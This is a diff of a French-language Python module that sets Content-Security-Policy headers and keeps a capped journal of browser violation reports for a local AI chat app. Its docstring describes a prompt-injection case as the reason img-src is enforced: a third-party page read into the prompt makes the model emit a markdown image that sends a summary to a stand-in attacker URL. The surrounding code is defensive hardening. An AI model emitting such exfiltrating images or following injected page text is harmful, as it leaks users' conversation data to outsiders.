@@ -7,7 +7,7 @@ limite cette EXFILTRATION VERS L'EXTÉRIEUR, et rien d'autre : un composant sur
 la même origine garde le token et l'accès aux endpoints locaux (l'étude le
 dit ; seule une iframe sandboxée couvre ce cas).
 
-**Report-Only pour la politique complète** (décision du 2026-09-26) : une
+**Report-Only pour le reste de la politique** (décision du 2026-09-26) : une
 semaine d'usage réel d'abord, puis lecture du journal. Le navigateur signale
 seulement ce qu'une politique bloquante aurait refusé. Si le journal montre
 qu'une fonction légitime serait cassée (Vite en dev, KaTeX, images générées,
@@ -16,7 +16,10 @@ pour faire taire le journal.
 
 **Exception : ``img-src`` est BLOQUANT** (décision d'Ilyann du 2026-10-18,
 PR #66), via un second en-tête ``Content-Security-Policy`` réduit à cette
-seule directive (:func:`politique_bloquante`). Déclencheur : la lecture
+seule directive (:func:`politique_bloquante`) — et RETIRÉE du Report-Only :
+une directive vit dans un seul en-tête. Mesuré le 2026-10-18 (Edge 155,
+CDP) : présente dans les deux, une image bloquée produisait deux rapports
+(``enforce`` + ``report``), comptés deux fois dans le journal. Déclencheur : la lecture
 directe d'URL injecte dans le prompt le texte d'une page écrite par un tiers,
 qui peut faire écrire au modèle ``![](https://attaquant/?q=<résumé>)`` — une
 ``<img>`` se charge sans clic. Le filtrage par liste côté rendu
@@ -37,11 +40,11 @@ ce journal (``report-uri`` est posé sur les deux en-têtes). Verrouillé par
 ``test_csp_observation.py`` (corps réel du navigateur rejoué jusqu'au
 fichier ; ``report-uri`` de dev absolu, Vite n'ayant aucun proxy).
 
-Relevé pendant cette mesure, NON corrigé : sur le build ouvert par
-``http://127.0.0.1:8000/``, l'interface appelle ``http://localhost:8000``
-(défaut de ``src/api.ts`` sans ``VITE_API_URL``) — autre origine, donc 14
-appels légitimes violent ``connect-src 'self'``. Sans effet en Report-Only ;
-à régler AVANT de rendre ``connect-src`` bloquant.
+Relevé pendant cette mesure, corrigé depuis (``src/api.ts``) : sur le build
+ouvert par ``http://127.0.0.1:8000/``, l'interface appelait
+``http://localhost:8000`` — autre origine, 14 violations de ``connect-src
+'self'``. Un build appelle désormais toujours la même origine ; banc CDP :
+0 violation ``connect-src`` par ``127.0.0.1:8000`` comme par ``localhost:8000``.
 
 Une seule définition des directives, ici. Deux consommateurs :
 
@@ -52,11 +55,26 @@ Une seule définition des directives, ici. Deux consommateurs :
   :data:`ORIGINES_BACKEND_DEV`. La copie côté Vite est comparée à celle-ci par
   ``test_csp_observation.py``.
 
-Le journal est AGRÉGÉ (directive × origine bloquée × document), borné en
-nombre d'entrées, et le point de collecte n'exige pas de token — le navigateur
-envoie ses rapports sans en-tête ``Authorization``. N'importe quelle page
-locale peut donc y écrire : c'est une donnée affichée, jamais interprétée
-(React échappe le texte), et l'agrégat borné empêche de remplir le disque.
+Le journal est AGRÉGÉ (directive × origine bloquée × document ×
+disposition), et le point de collecte n'exige pas de token — le navigateur
+envoie ses rapports sans en-tête ``Authorization``. Bornes (2026-10-18, après
+relevé : 64 Kio, 200 entrées en gardant les PREMIÈRES, hôte non tronqué —
+120 Ko pour une seule entrée — et tout ``Content-Type`` accepté) :
+
+- corps de 16 Kio au plus ;
+- seuls ``application/csp-report`` et ``application/reports+json``, les deux
+  types qu'emploie le navigateur. ``text/plain`` était une requête « simple »
+  (sans préflight) qu'une page tierce pouvait envoyer à l'aveugle ; les deux
+  types retenus, eux, exigent un préflight CORS pour un ``fetch``. Reste
+  possible : une page tierce dont la PROPRE CSP pointe ``report-uri`` ici —
+  d'où les bornes suivantes ;
+- 500 entrées, les plus récemment vues gardées (une page qui remplit le
+  journal tôt ne rend plus muette une violation ultérieure) ;
+- chaque champ tronqué : la taille du journal est bornée, pas seulement le
+  nombre d'entrées.
+
+Le contenu est une donnée affichée, jamais interprétée (React échappe le
+texte).
 """
 
 import time
@@ -69,9 +87,14 @@ from core.paths import resolve_data_dir
 #: Chemin du point de collecte (exempté d'authentification dans main.py).
 CHEMIN_RAPPORT = "/csp/report"
 #: Taille maximale d'un corps de rapport accepté (octets).
-TAILLE_MAX = 64 * 1024
-#: Nombre maximal d'entrées agrégées conservées.
-ENTREES_MAX = 200
+TAILLE_MAX = 16 * 1024
+#: Nombre maximal d'entrées agrégées conservées (les plus récemment vues).
+ENTREES_MAX = 500
+#: Seuls types de corps acceptés : ceux du navigateur (``report-uri``,
+#: ``report-to``). Cf. la docstring du module.
+TYPES_ACCEPTES = ("application/csp-report", "application/reports+json")
+#: Longueur maximale d'une origine ou d'un champ court conservé.
+_LONGUEUR_ORIGINE = 200
 
 #: Origines du backend vu depuis Vite (:5173) — en dev, ce n'est pas ``'self'``.
 ORIGINES_BACKEND_DEV = (
@@ -90,10 +113,19 @@ DIRECTIVES = (
 )
 
 
+#: Directives BLOQUANTES (en-tête ``Content-Security-Policy``) — sous-ensemble
+#: de :data:`DIRECTIVES`, cf. la docstring du module pour la décision. Elles
+#: sont RETIRÉES de :func:`politique` (Report-Only) : sinon chaque blocage
+#: produit aussi un rapport ``report`` et le journal compte deux fois.
+DIRECTIVES_BLOQUANTES = ("img-src 'self' data: blob:",)
+assert all(d in DIRECTIVES for d in DIRECTIVES_BLOQUANTES)
+
+
 def politique(origines_backend: tuple[str, ...] = (), rapport: str = CHEMIN_RAPPORT) -> str:
-    """Valeur de ``Content-Security-Policy-Report-Only``."""
+    """Valeur de ``Content-Security-Policy-Report-Only`` : les directives
+    qui ne sont pas bloquantes."""
     backend = "".join(f" {o}" for o in origines_backend)
-    parties = [d.format(backend=backend) for d in DIRECTIVES]
+    parties = [d.format(backend=backend) for d in DIRECTIVES if d not in DIRECTIVES_BLOQUANTES]
     # ``report-uri`` SEUL, et pas ``report-to`` : mesuré le 2026-09-26 (Edge,
     # CDP), dès que ``report-to`` est présent Chromium ignore ``report-uri`` et
     # met les rapports en file dans l'API Reporting — ils y restaient
@@ -101,15 +133,6 @@ def politique(origines_backend: tuple[str, ...] = (), rapport: str = CHEMIN_RAPP
     # ``report-uri`` est déprécié mais livré tout de suite (Chromium, Firefox).
     parties.append(f"report-uri {rapport}")
     return "; ".join(parties)
-
-
-#: Directives BLOQUANTES (en-tête ``Content-Security-Policy``) — sous-ensemble
-#: de :data:`DIRECTIVES`, cf. la docstring du module pour la décision. Même
-#: ``img-src`` que la politique d'observation : les deux ne doivent pas
-#: diverger, sinon le journal parlerait d'une politique qui n'est pas celle
-#: appliquée.
-DIRECTIVES_BLOQUANTES = ("img-src 'self' data: blob:",)
-assert all(d in DIRECTIVES for d in DIRECTIVES_BLOQUANTES)
 
 
 def politique_bloquante(rapport: str = CHEMIN_RAPPORT) -> str:
@@ -125,6 +148,32 @@ def entetes(rapport: str = CHEMIN_RAPPORT) -> dict[str, str]:
     }
 
 
+#: En-tête servi → mode affiché.
+_MODES = {"Content-Security-Policy": "bloquant",
+          "Content-Security-Policy-Report-Only": "report-only"}
+
+
+def directives_servies() -> list[dict]:
+    """Mode de chaque directive, LU dans :func:`entetes` — la fonction même
+    qui pose les en-têtes sur ``index.html`` —, jamais recopié : si la
+    politique servie change, ce que Réglages affiche change avec elle.
+    ``report-uri`` n'est pas une directive de contrôle, elle est omise."""
+    sortie = []
+    for entete, valeur in entetes().items():
+        for partie in valeur.split(";"):
+            nom, _, reste = partie.strip().partition(" ")
+            if nom and nom != "report-uri":
+                sortie.append({"directive": nom, "mode": _MODES.get(entete, entete),
+                               "valeur": reste.strip()})
+    return sortie
+
+
+def type_accepte(content_type: str | None) -> bool:
+    """``Content-Type`` d'un rapport du navigateur (paramètres et casse
+    ignorés) ?"""
+    return (content_type or "").split(";")[0].strip().lower() in TYPES_ACCEPTES
+
+
 def _journal():
     """Fonction et non constante : cf. core.paths.resolve_data_dir."""
     return resolve_data_dir() / "csp_violations.json"
@@ -134,10 +183,13 @@ def _origine(url: Any) -> str:
     """Réduit une URL bloquée à son origine (``inline``, ``eval``… tels quels) :
     le chemin complet porterait des paramètres, parfois sensibles, et
     multiplierait les entrées sans rien apprendre de plus."""
-    s = str(url or "")
-    parts = urlsplit(s)
+    s = str(url or "")[:2048]
+    try:
+        parts = urlsplit(s)
+    except ValueError:  # IPv6 mal formé, par exemple : rien à en tirer
+        return s[:80]
     if parts.scheme and parts.netloc:
-        return f"{parts.scheme}://{parts.netloc}"
+        return f"{parts.scheme}://{parts.netloc}"[:_LONGUEUR_ORIGINE]
     return (parts.scheme or s)[:80]
 
 
@@ -153,6 +205,7 @@ def _normaliser(brut: Any) -> list[dict]:
             "bloque": r.get("blocked-uri"),
             "document": r.get("document-uri"),
             "source": r.get("source-file"),
+            "disposition": r.get("disposition"),
         })
     elif isinstance(brut, list):
         for item in brut:
@@ -164,12 +217,18 @@ def _normaliser(brut: Any) -> list[dict]:
                 "bloque": b.get("blockedURL"),
                 "document": b.get("documentURL"),
                 "source": b.get("sourceFile"),
+                "disposition": b.get("disposition"),
             })
     return rapports
 
 
 def enregistrer(brut: Any) -> int:
-    """Agrège les rapports reçus dans le journal. Retourne le nombre retenu."""
+    """Agrège les rapports reçus dans le journal. Retourne le nombre retenu.
+
+    Ordre d'insertion = ordre de dernière vue (une entrée revue est replacée
+    en fin), conservé par le JSON : au-delà de :data:`ENTREES_MAX`, on retire
+    par le début. Pas un tri sur ``dernier`` : un envoi groupé donne la même
+    seconde à toutes ses entrées."""
     rapports = _normaliser(brut)
     if not rapports:
         return 0
@@ -178,19 +237,20 @@ def enregistrer(brut: Any) -> int:
         entrees = doc.setdefault("entrées", {})
         for r in rapports:
             directive = str(r["directive"] or "?")[:60]
+            disposition = str(r["disposition"] or "?")[:20]
             bloque = _origine(r["bloque"])
             document = _origine(r["document"])
-            cle = f"{directive}|{bloque}|{document}"
-            e = entrees.get(cle)
-            if e is None:
-                if len(entrees) >= ENTREES_MAX:
-                    continue  # borné : les nouvelles sortes au-delà sont ignorées
-                e = entrees[cle] = {
-                    "directive": directive, "bloqué": bloque, "document": document,
-                    "source": _origine(r["source"]), "nombre": 0, "premier": maintenant,
-                }
+            cle = f"{directive}|{bloque}|{document}|{disposition}"
+            e = entrees.pop(cle, None) or {
+                "directive": directive, "bloqué": bloque, "document": document,
+                "disposition": disposition, "source": _origine(r["source"]),
+                "nombre": 0, "premier": maintenant,
+            }
             e["nombre"] += 1
             e["dernier"] = maintenant
+            entrees[cle] = e
+            while len(entrees) > ENTREES_MAX:
+                del entrees[next(iter(entrees))]
     return len(rapports)
 
 
